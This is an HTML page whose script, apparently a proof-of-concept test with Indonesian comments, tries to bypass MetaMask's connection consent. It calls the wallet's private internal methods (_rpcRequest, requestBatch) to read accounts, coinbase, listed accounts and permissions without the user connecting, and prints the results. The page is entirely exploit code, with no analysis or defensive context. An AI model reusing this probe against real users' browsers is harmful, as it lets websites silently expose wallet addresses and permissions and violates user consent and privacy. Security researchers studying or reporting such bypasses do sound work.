<!DOCTYPE html>
<html>
<body>
<button onclick="test()">Bypass Test</button>
<pre id="result">...</pre>

<script>
async function test() {
  const r = document.getElementById('result');
  let out = '';

  // 1. Coba eth_accounts via _rpcRequest
  // tanpa connect dulu
  out += '=== eth_accounts bypass ===\n';
  await new Promise(resolve => {
    window.ethereum._rpcRequest(
      { method: 'eth_accounts', params: [] },
      (err, result) => {
        out += JSON.stringify(result) + '\n';
        resolve();
      }
    );
  });

  // 2. Coba requestBatch untuk bypass
  out += '\n=== requestBatch bypass ===\n';
  try {
    const result = await window.ethereum._metamask.requestBatch([
      { method: 'eth_accounts', params: [] },
      { method: 'eth_chainId', params: [] },
      { method: 'net_version', params: [] }
    ]);
    out += JSON.stringify(result, null, 2) + '\n';
  } catch(e) {
    out += 'Error: ' + e.message + '\n';
  }

  // 3. Coba wallet_getPermissions
  out += '\n=== wallet_getPermissions ===\n';
  await new Promise(resolve => {
    window.ethereum._rpcRequest(
      { method: 'wallet_getPermissions', params: [] },
      (err, result) => {
        out += JSON.stringify(result, null, 2) + '\n';
        resolve();
      }
    );
  });

  // 4. Coba eth_coinbase tanpa connect
  out += '\n=== eth_coinbase ===\n';
  await new Promise(resolve => {
    window.ethereum._rpcRequest(
      { method: 'eth_coinbase', params: [] },
      (err, result) => {
        out += JSON.stringify(result) + '\n';
        resolve();
      }
    );
  });

  // 5. Coba personal_listAccounts
  out += '\n=== personal_listAccounts ===\n';
  await new Promise(resolve => {
    window.ethereum._rpcRequest(
      { method: 'personal_listAccounts', params: [] },
      (err, result) => {
        out += JSON.stringify(result) + '\n';
        resolve();
      }
    );
  });

  r.textContent = out;
}
</script>
</body>
</html>
